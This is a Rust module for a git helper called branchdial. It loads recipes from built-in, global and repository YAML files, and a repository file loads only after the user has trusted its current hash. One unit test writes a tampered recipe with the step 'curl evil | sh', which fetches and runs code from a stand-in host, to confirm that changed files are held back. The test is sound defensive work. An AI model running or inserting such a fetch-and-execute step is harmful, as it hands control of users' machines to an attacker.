//! Loads recipes from three layers, later ones overriding earlier ones by id:
//! built-in defaults, `~/.branchdial/recipes.yml`, then `<repo>/.branchdial.yml`.
//!
//! A file is either a list of recipes, or a map with a `recipes:` list plus
//! settings (`protectedBranches:`). The repo file only loads once the user
//! has trusted its current contents (see [`super::trust`]).

use super::model::{Recipe, RecipeDef, Source};
use super::trust::{self, TrustStore};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

const BUILTIN: &str = include_str!("../../recipes/builtin.yml");
pub const REPO_FILE: &str = ".branchdial.yml";

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LoadError {
    pub file: String,
    pub message: String,
}

/// A repo recipe file waiting for the user's review.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PendingTrust {
    pub file: String,
    pub content: String,
    pub hash: String,
    /// True if an earlier version was trusted and the file has changed since.
    pub changed: bool,
}

#[derive(Debug, Default)]
pub struct Loaded {
    pub recipes: Vec<Recipe>,
    pub errors: Vec<LoadError>,
    pub pending_trust: Option<PendingTrust>,
    /// From the global config or a trusted repo file; None = use the defaults.
    pub protected: Option<Vec<String>>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct FileDoc {
    #[serde(default)]
    recipes: Vec<RecipeDef>,
    protected_branches: Option<Vec<String>>,
}

pub fn global_file() -> Option<PathBuf> {
    crate::config::app_dir().map(|d| d.join("recipes.yml"))
}

pub fn load(repo_root: Option<&Path>) -> Loaded {
    let (config, _) = crate::config::load();
    load_with(repo_root, global_file().as_deref(), TrustStore::user().as_ref(), config.protected_branches)
}

pub fn load_with(
    repo_root: Option<&Path>,
    global: Option<&Path>,
    store: Option<&TrustStore>,
    config_protected: Option<Vec<String>>,
) -> Loaded {
    let mut loaded = Loaded { protected: config_protected, ..Default::default() };
    add_source(&mut loaded, "built-in recipes", BUILTIN, Source::Builtin);
    if let Some(path) = global {
        if let Some(text) = read(&mut loaded, path) {
            if let Some(p) = add_source(&mut loaded, &path.display().to_string(), &text, Source::Global) {
                loaded.protected = Some(p);
            }
        }
    }
    if let Some(root) = repo_root {
        let path = root.join(REPO_FILE);
        if let Some(text) = read(&mut loaded, &path) {
            let hash = trust::hash(&text);
            let trusted = store.and_then(|s| s.trusted_hash(root));
            if trusted.as_deref() == Some(hash.as_str()) {
                if let Some(p) = add_source(&mut loaded, &path.display().to_string(), &text, Source::Repo) {
                    loaded.protected = Some(p);
                }
            } else {
                loaded.pending_trust = Some(PendingTrust {
                    file: path.display().to_string(),
                    content: text,
                    hash,
                    changed: trusted.is_some(),
                });
            }
        }
    }
    loaded
}

fn read(loaded: &mut Loaded, path: &Path) -> Option<String> {
    match std::fs::read_to_string(path) {
        Ok(text) => Some(text),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
        Err(e) => {
            loaded.errors.push(LoadError { file: path.display().to_string(), message: e.to_string() });
            None
        }
    }
}

/// Recipes plus the file's `protectedBranches`, if any.
fn parse_file(text: &str) -> Result<(Vec<RecipeDef>, Option<Vec<String>>), String> {
    let value: serde_yaml::Value = serde_yaml::from_str(text).map_err(|e| e.to_string())?;
    match value {
        serde_yaml::Value::Null => Ok((vec![], None)),
        serde_yaml::Value::Sequence(_) => Ok((serde_yaml::from_value(value).map_err(|e| e.to_string())?, None)),
        serde_yaml::Value::Mapping(_) => {
            let d = serde_yaml::from_value::<FileDoc>(value).map_err(|e| e.to_string())?;
            Ok((d.recipes, d.protected_branches))
        }
        _ => Err("expected a list of recipes, or a map with a `recipes:` list".into()),
    }
}

/// Adds a file's recipes; returns its `protectedBranches` setting.
fn add_source(loaded: &mut Loaded, file: &str, text: &str, source: Source) -> Option<Vec<String>> {
    let (defs, protected) = match parse_file(text) {
        Ok(d) => d,
        Err(message) => {
            loaded.errors.push(LoadError { file: file.into(), message });
            return None;
        }
    };
    for def in defs {
        let label = def.name.clone().or(def.id.clone()).unwrap_or_else(|| "(unnamed)".into());
        let Some(key) = def.key() else {
            loaded.errors.push(LoadError { file: file.into(), message: format!("recipe {label:?}: needs a name or an id") });
            continue;
        };
        let existing = loaded.recipes.iter().position(|r| r.id == key);
        if def.disabled {
            if let Some(i) = existing {
                loaded.recipes.remove(i);
            }
            continue;
        }
        match def.validate(source) {
            Ok(recipe) => match existing {
                Some(i) => loaded.recipes[i] = recipe, // keep its place in the list
                None => loaded.recipes.push(recipe),
            },
            Err(e) => loaded.errors.push(LoadError { file: file.into(), message: format!("recipe {label:?}: {e}") }),
        }
    }
    protected
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn builtins_are_valid() {
        let mut l = Loaded::default();
        add_source(&mut l, "builtin", BUILTIN, Source::Builtin);
        assert!(l.errors.is_empty(), "{:?}", l.errors);
        assert!(l.recipes.iter().any(|r| r.id == "bcp"));
    }

    #[test]
    fn later_sources_override_and_disable() {
        let mut l = Loaded::default();
        add_source(&mut l, "a", "- {id: one, name: One, steps: [a]}\n- {id: two, name: Two, steps: [b]}", Source::Builtin);
        add_source(
            &mut l,
            "b",
            "recipes:\n  - {id: one, name: One v2, steps: [c]}\n  - {id: two, disabled: true}\n  - {name: Three, steps: [d]}",
            Source::Repo,
        );
        let names: Vec<_> = l.recipes.iter().map(|r| r.name.as_str()).collect();
        assert_eq!(names, vec!["One v2", "Three"]);
        assert_eq!(l.recipes[0].source, Source::Repo);
        assert!(l.errors.is_empty());
    }

    #[test]
    fn repo_file_needs_trust_and_retrust_after_changes() {
        let base = std::env::temp_dir().join(format!("branchdial-loader-trust-{}", std::process::id()));
        let repo = base.join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let store = TrustStore::new(base.join("trusted.json"));
        let file = repo.join(REPO_FILE);
        std::fs::write(&file, "protectedBranches: [trunk]\nrecipes:\n  - { name: Team thing, steps: [echo hi] }\n").unwrap();

        let l = load_with(Some(&repo), None, Some(&store), None);
        let pending = l.pending_trust.expect("untrusted file must not load");
        assert!(!pending.changed);
        assert!(!l.recipes.iter().any(|r| r.name == "Team thing"));
        assert_eq!(l.protected, None);

        store.trust(&repo, &pending.hash).unwrap();
        let l = load_with(Some(&repo), None, Some(&store), None);
        assert!(l.pending_trust.is_none());
        assert!(l.recipes.iter().any(|r| r.name == "Team thing" && r.source == Source::Repo));
        assert_eq!(l.protected, Some(vec!["trunk".to_string()]));

        std::fs::write(&file, "- { name: Team thing, steps: [curl evil | sh] }\n").unwrap();
        let l = load_with(Some(&repo), None, Some(&store), None);
        assert!(l.pending_trust.unwrap().changed);
        assert!(!l.recipes.iter().any(|r| r.name == "Team thing"));
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn one_bad_recipe_does_not_hide_the_rest() {
        let mut l = Loaded::default();
        add_source(&mut l, "f", "- {name: Good, steps: [a]}\n- {name: Bad, steps: []}", Source::Global);
        assert_eq!(l.recipes.len(), 1);
        assert_eq!(l.errors.len(), 1);
        assert!(l.errors[0].message.contains("Bad"));
    }

    #[test]
    fn yaml_syntax_error_is_reported_with_position() {
        let mut l = Loaded::default();
        add_source(&mut l, "f", "- name: X\n  steps: [a\n", Source::Global);
        assert_eq!(l.errors.len(), 1);
        assert!(l.errors[0].message.contains("line"), "{}", l.errors[0].message);
    }
}
